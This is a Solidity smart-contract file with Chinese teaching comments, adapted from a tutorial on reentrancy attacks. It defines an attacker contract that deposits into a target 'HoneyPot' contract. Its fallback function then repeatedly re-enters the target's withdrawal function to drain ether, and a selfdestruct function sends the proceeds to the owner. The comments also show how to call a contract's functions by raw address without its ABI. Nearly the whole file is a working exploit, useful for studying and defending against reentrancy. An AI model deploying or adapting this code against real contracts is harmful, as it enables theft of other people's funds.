// Modified from: 
// https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4

pragma solidity ^0.4.23;

import "./Ownable.sol";
import "./HoneyPotCopy.sol";

contract HoneyPotCollect is Ownable{
    HoneyPotCopy public honeypot;

    constructor(address _honeypot) public {
        owner = msg.sender;
        // 注意: 攻擊對象只是interface
        // 實際上這裡提供的是ABI和合約部署address
        // 而呼叫執行外部合約只需要ABI和合約部署address
        // 實際將執行已部署的合約內的實作
        honeypot = HoneyPotCopy(_honeypot);

        // 實際上就算沒有ABI，但知道目標合約的address和function宣告
        // 也能透過下述方式呼叫目標合約上的函數，所以有ABI只是比較方便
        // address(contract).call(bytes4(sha3("func(args...)")));
    }

    function kill (address beneficiary) public onlyOwner {
        // selfdestruct() 函數是唯一能將合約從區塊鏈上移除的方式
        // 合約移除前將會把合約內全部以太幣轉給指定帳戶
        // 最後移除合約儲存狀態和程式碼
        selfdestruct(beneficiary);

        // 關方對於selfdestruct函數的警告:
        //   Even if a contract’s code does not contain a call to selfdestruct, 
        //   it can still perform that operation using delegatecall or callcode.
        // 不用擔心:
        //   https://ethereum.stackexchange.com/questions/39762/is-it-possible-to-delete-a-smart-contract-if-selfdestruct-not-implemented-in-i
        //   https://ethereum.stackexchange.com/questions/15087/how-to-steal-eth-using-delegatecall-and-selfdestruct
    }

    function collect() payable public {
      honeypot.put.value(msg.value)();
      honeypot.get();
    }

    function () payable public {
        if (address(honeypot).balance >= msg.value) {
            honeypot.get();
        }
    }
}